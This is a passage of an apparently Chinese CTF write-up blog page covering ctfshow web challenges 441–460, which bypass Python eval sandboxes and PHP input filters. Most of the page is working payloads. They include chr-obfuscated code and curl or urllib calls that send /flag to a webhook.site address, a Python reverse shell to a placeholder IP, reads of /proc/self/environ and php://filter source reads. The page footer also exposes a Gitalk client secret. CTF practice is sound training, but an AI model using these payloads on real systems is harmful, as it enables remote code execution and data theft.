+<pre><code>?code=str(exec(chr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(32)%2bchr(111)%2bchr(115)%2bchr(59)%2bchr(111)%2bchr(115)%2bchr(46)%2bchr(115)%2bchr(121)%2bchr(115)%2bchr(116)%2bchr(101)%2bchr(109)%2bchr(40)%2bchr(34)%2bchr(99)%2bchr(117)%2bchr(114)%2bchr(108)%2bchr(32)%2bchr(104)%2bchr(116)%2bchr(116)%2bchr(112)%2bchr(115)%2bchr(58)%2bchr(47)%2bchr(47)%2bchr(119)%2bchr(101)%2bchr(98)%2bchr(104)%2bchr(111)%2bchr(111)%2bchr(107)%2bchr(46)%2bchr(115)%2bchr(105)%2bchr(116)%2bchr(101)%2bchr(47)%2bchr(54)%2bchr(50)%2bchr(54)%2bchr(57)%2bchr(56)%2bchr(50)%2bchr(48)%2bchr(98)%2bchr(45)%2bchr(50)%2bchr(49)%2bchr(48)%2bchr(53)%2bchr(45)%2bchr(52)%2bchr(52)%2bchr(53)%2bchr(56)%2bchr(45)%2bchr(98)%2bchr(54)%2bchr(100)%2bchr(101)%2bchr(45)%2bchr(98)%2bchr(48)%2bchr(53)%2bchr(51)%2bchr(48)%2bchr(50)%2bchr(100)%2bchr(50)%2bchr(48)%2bchr(57)%2bchr(98)%2bchr(97)%2bchr(47)%2bchr(63)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(61)%2bchr(96)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(96)%2bchr(34)%2bchr(41)))
+</code></pre>
+<h2 id="web441">web441</h2>
+<h2 id="web442">web442</h2>
+<p>又过滤了数字。</p>
+<p>使用传参绕过,参数名字处需要用引号，使用request.method来绕过引号。</p>
+<pre><code>?code=str(exec(request.args.get(request.method)))&amp;GET=import%20os;os.system(&quot;curl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`&quot;)
+</code></pre>
+<h2 id="web443">web443</h2>
+<h2 id="web444">web444</h2>
+<p>过滤了request，利用全局变量来获取字符。</p>
+<pre><code>code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))
+
+/?POST=import%20os;os.system(%22curl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`%22)
+</code></pre>
+<h2 id="web445">web445</h2>
+<h2 id="web446">web446</h2>
+<p>提供了源码</p>
+<p>app.py</p>
+<pre><code class="language-py">from flask import Flask
+from flask import request
+import re
+import os
+del os.system
+del os.popen
+del imp.reload
+
+app = Flask(__name__)
+
+def Q2B(uchar):
+    inside_code = ord(uchar)
+    if inside_code == 0x3000:
+        inside_code = 0x0020
+    else:
+        inside_code -= 0xfee0
+    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: 
+        return uchar
+    return chr(inside_code)
+
+def stringQ2B(ustring):
+    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])
+
+@app.route('/',methods=['POST', 'GET'])
+def app_index():
+    if request.method == 'POST':
+        code = request.form['code']
+        if code:
+        	code = stringQ2B(code)
+        	if '\\u' in code:
+        		return 'hacker?'
+        	if '\\x' in code:
+        		return 'hacker?'
+        	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|&quot;|\+|[0-9]|request|len')
+        	if reg.search(code)==None:
+        		return eval(code)
+    return 'where is flag?&lt;!-- /?code --&gt;'
+
+if __name__==&quot;__main__&quot;:
+    app.run(host='0.0.0.0',port=80)
+</code></pre>
+<p>删掉了os.system等用来执行命令的库。</p>
+<p>利用socket、subprocess来获取shell。</p>
+<pre><code>code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))
+
+/?POST=import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
+</code></pre>
+<h2 id="web447">web447</h2>
+<p>源码</p>
+<pre><code class="language-py">from flask import Flask
+from flask import request
+import re
+import os
+import imp
+del os.system
+del os.popen
+del imp.reload
+import subprocess
+del subprocess.Popen
+del subprocess.call
+del subprocess.run
+del subprocess.getstatusoutput
+del subprocess.getoutput
+del subprocess.check_call
+del subprocess.check_output
+import timeit
+del timeit.timeit
+
+app = Flask(__name__)
+
+def Q2B(uchar):
+    inside_code = ord(uchar)
+    if inside_code == 0x3000:
+        inside_code = 0x0020
+    else:
+        inside_code -= 0xfee0
+    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: 
+        return uchar
+    return chr(inside_code)
+
+def stringQ2B(ustring):
+    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])
+
+@app.route('/',methods=['POST', 'GET'])
+def app_index():
+    if request.method == 'POST':
+        code = request.form['code']
+        if code:
+        	code = stringQ2B(code)
+        	if '\\u' in code:
+        		return 'hacker?'
+        	if '\\x' in code:
+        		return 'hacker?'
+        	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|&quot;|\+|[0-9]|request|len')
+        	if reg.search(code)==None:
+        		return eval(code)
+    return 'where is flag?&lt;!-- /?code --&gt;'
+
+if __name__==&quot;__main__&quot;:
+    app.run(host='0.0.0.0',port=80)
+</code></pre>
+<p>可以用reload重新下回来删掉的库。</p>
+<pre><code>code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))
+
+/?POST=from%20importlib%20import%20reload;import%20os;reload(os);os.system(%22curl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`%22)
+</code></pre>
+<h2 id="web448">web448</h2>
+<p>源码</p>
+<pre><code class="language-py">from flask import Flask
+from flask import request
+import re
+import sys 
+sys.modules['os']=None
+sys.modules['imp']=None
+sys.modules['subprocess']=None
+sys.modules['socket']=None
+sys.modules['timeit']=None
+sys.modules['platform']=None
+
+app = Flask(__name__)
+
+def Q2B(uchar):
+    inside_code = ord(uchar)
+    if inside_code == 0x3000:
+        inside_code = 0x0020
+    else:
+        inside_code -= 0xfee0
+    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: 
+        return uchar
+    return chr(inside_code)
+
+def stringQ2B(ustring):
+    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])
+
+@app.route('/',methods=['POST', 'GET'])
+def app_index():
+    if request.method == 'POST':
+        code = request.form['code']
+        if code:
+        	code = stringQ2B(code)
+        	if '\\u' in code:
+        		return 'hacker?'
+        	if '\\x' in code:
+        		return 'hacker?'
+        	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|&quot;|\+|[0-9]|request|len')
+        	if reg.search(code)==None:
+        		return eval(code)
+    return 'where is flag?&lt;!-- /?code --&gt;'
+
+if __name__==&quot;__main__&quot;:
+    app.run(host='0.0.0.0',port=80)
+</code></pre>
+<p>payload</p>
+<pre><code>code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))
+
+/?POST=import%20sys;del%20sys.modules['os'];import%20os;os.system(%22curl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`%22); 
+</code></pre>
+<h2 id="web449">web449</h2>
+<p>源码</p>
+<pre><code class="language-py">from flask import Flask
+from flask import request
+import re
+import sys 
+sys.modules['os']=None
+sys.modules['imp']=None
+sys.modules['subprocess']=None
+sys.modules['socket']=None
+sys.modules['timeit']=None
+sys.modules['platform']=None
+sys.modules['sys']=None
+
+app = Flask(__name__)
+sys.modules['importlib']=None
+del sys
+
+def Q2B(uchar):
+    inside_code = ord(uchar)
+    if inside_code == 0x3000:
+        inside_code = 0x0020
+    else:
+        inside_code -= 0xfee0
+    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: 
+        return uchar
+    return chr(inside_code)
+
+def stringQ2B(ustring):
+    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])
+
+
+@app.route('/',methods=['POST', 'GET'])
+def app_index():
+    if request.method == 'POST':
+        code = request.form['code']
+        if code:
+        	code = stringQ2B(code)
+        	if '\\u' in code:
+        		return 'hacker?'
+        	if '\\x' in code:
+        		return 'hacker?'
+        	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|&quot;|\+|[0-9]|request|len')
+        	if reg.search(code)==None:
+        		return eval(code)
+    return 'where is flag?&lt;!-- /?code --&gt;'
+
+if __name__==&quot;__main__&quot;:
+    app.run(host='0.0.0.0',port=80)
+</code></pre>
+<p>使用其他库，发送url请求。</p>
+<pre><code>code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))
+
+/?POST=s=open('/flag').read();import%20urllib;urllib.request.urlopen('https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag='%2bs);
+</code></pre>
+<h2 id="web450">web450</h2>
+<p>源码·</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+$ctfshow=$_GET['ctfshow'];
+
+
+if(preg_match('/^[a-z]+[\^][a-z]+[\^][a-z]+$/', $ctfshow)){
+    eval(&quot;($ctfshow)();&quot;);
+}
+</code></pre>
+<p>限制必须满足正则，含有两个异或符号。<br>
+进行两次相同异或刚好抵消。</p>
+<pre><code>?ctfshow=phpinfo^phpinfo^phpinfo
+</code></pre>
+<h2 id="web451">web451</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+$ctfshow=$_GET['ctfshow'];
+
+
+if(preg_match('/^[a-z]+[\^][a-z]+[\^][a-z]+$/', $ctfshow)){
+    if(!preg_match('/phpinfo/', $ctfshow)){
+        eval(&quot;($ctfshow)();&quot;);
+    }
+}
+</code></pre>
+<p>多了一个正则，要求不能含有phpinfo<br>
+根据异或运算构造一下。</p>
+<pre><code>?ctfshow=phpinfl^aaaaaaa^aaaaaab
+</code></pre>
+<h2 id="web452">web452</h2>
+<p>源码·</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+$ctfshow=$_GET['ctfshow'];
+
+
+if(!preg_match('/\'|\&quot;|[0-9]|\{|\[|\~|\^|phpinfo|\$/i', $ctfshow)){
+    eval($ctfshow);
+}
+</code></pre>
+<p>这里使用system函数，参数不使用引号，也能够识别。</p>
+<pre><code>/?ctfshow=system(env);
+</code></pre>
+<h2 id="web453">web453</h2>
+<h2 id="web454">web454</h2>
+<h2 id="web455">web455</h2>
+<h2 id="web456">web456</h2>
+<p>根据提示，存在任意文件读取。</p>
+<pre><code class="language-php">file_get_contents($_POST['s'])
+</code></pre>
+<p>读取当前进程的环境变量。</p>
+<pre><code>s=/proc/self/environ
+</code></pre>
+<h2 id="web457">web457</h2>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+include('flag.php');
+abstract class user{
+    public  $username;
+    public  $password;
+    function __construct($u,$p){
+        $this-&gt;username=$u;
+        $this-&gt;password=$p;
+    }
+    abstract  public  function check();
+}
+
+class visitor extends user{
+    public  function check(){
+        return ($this-&gt;username!=='admin' &amp;&amp; $this-&gt;password!=='admin888');
+    }
+}
+
+class admin extends user{
+    public  function check(){
+        $u= call_user_func($this-&gt;password);
+        return $u=='admin';
+    }
+}
+
+
+$u=$_GET['u'];
+$p=$_GET['p'];
+
+if(isset($u)&amp;&amp;isset($p)){
+    if((new visitor($u,$p))-&gt;check()){
+        die('welcome visitor :'.$u);
+    }
+    if((new admin($u,$p))-&gt;check()){
+        die('welcome admin :'.$u.' flag is :'.$flag);
+    }
+}
+</code></pre>
+<p>分析代码逻辑，可以使用call_user_func来调用任意函数，然后成功调用phpinfo后返回值为true，可以通过双等号的判断。</p>
+<pre><code>?u=admin&amp;p=phpinfo
+</code></pre>
+<h2 id="web458">web458</h2>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+include('flag.php');
+abstract class user{
+    public  $username;
+    public  $password;
+    function __construct($u,$p){
+        $this-&gt;username=$u;
+        $this-&gt;password=$p;
+    }
+    abstract  public  function check();
+}
+
+class visitor extends user{
+    public  function check(){
+        return ($this-&gt;username!=='admin' &amp;&amp; $this-&gt;password!=='admin888');
+    }
+}
+
+class admin extends user{
+    public  function check(){
+        $u= call_user_func($this-&gt;password);
+        return $u==='admin';
+    }
+}
+
+
+$u=$_GET['u'];
+$p=$_GET['p'];
+
+if(isset($u)&amp;&amp;isset($p)){
+    if((new visitor($u,$p))-&gt;check()){
+        die('welcome visitor :'.$u);
+    }
+    if((new admin($u,$p))-&gt;check()){
+        die('welcome admin :'.$u.' flag is :'.$flag);
+    }
+}
+</code></pre>
+<p>这里改为了三等号，考虑其他的php无参函数。</p>
+<pre><code>get_class (): 获取当前调用方法的类名； 
+get_called_class():获取静态绑定后的类名；
+</code></pre>
+<p>刚好获得的类名为admin</p>
+<pre><code>?u=admin&amp;p=get_class
+?u=admin&amp;p=get_called_class
+</code></pre>
+<h2 id="web459">web459</h2>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+include('flag.php');
+
+
+$u=$_GET['u'];
+$p=$_GET['p'];
+
+if(isset($u)&amp;&amp;isset($p)){
+    copy($u, $p.'.php');
+}
+</code></pre>
+<p>利用php伪协议转换编码，来读取flag.php</p>
+<pre><code>/?u=php://filter/read=convert.base64-encode/resource=flag.php&amp;p=a
+</code></pre>
+<h2 id="web460">web460</h2>
+<pre><code class="language-py">from flask import Flask
+from flask import request
+import re
+import sys 
+from func_timeout import func_set_timeout
+import time
+import func_timeout
+import random
+
+sys.modules['os']=None
+sys.modules['imp']=None
+sys.modules['subprocess']=None
+sys.modules['socket']=None
+sys.modules['timeit']=None
+sys.modules['platform']=None
+sys.modules['sys']=None
+
+app = Flask(__name__)
+sys.modules['importlib']=None
+del sys
+
+@func_set_timeout(0.7)
+def run(s):
+    time.sleep(randmon.random())
+    return eval(s)
+
+def Q2B(uchar):
+    inside_code = ord(uchar)
+    if inside_code == 0x3000:
+        inside_code = 0x0020
+    else:
+        inside_code -= 0xfee0
+    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: 
+        return uchar
+    return chr(inside_code)
+
+def stringQ2B(ustring):
+    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])
+
+
+@app.route('/',methods=['POST', 'GET'])
+def app_index():
+    if request.method == 'POST':
+        code = request.form['code']
+        if code:
+            code = stringQ2B(code)
+            if '\\u' in code:
+                return 'hacker?'
+            if '\\x' in code:
+                return 'hacker?'
+            reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|&quot;|\+|[0-9]|request|len')
+            if reg.search(code)==None:
+                try:
+                    s=run(code)
+                    return s
+                except func_timeout.exceptions.FunctionTimedOut:
+                    return exec('1')
+    return 'where is flag?&lt;!-- /?code --&gt;'
+
+if __name__==&quot;__main__&quot;:
+    app.run(host='0.0.0.0',port=8080)
+</code></pre>
+<p>暂时不知道咋做。。。</p>
+<pre><code>s = 'import urllib.request;import ssl;f=open(&quot;/flag&quot;).read(100);context = ssl._create_unverified_context();url = &quot;http://xxx?1=&quot;+f;request = urllib.request.Request(url);response = urllib.request.urlopen(url=request,context=context)'
+
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowhei-he-ce-shi/">
+                  <h3 class="post-title">
+                    [ctfshow]黑盒测试
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
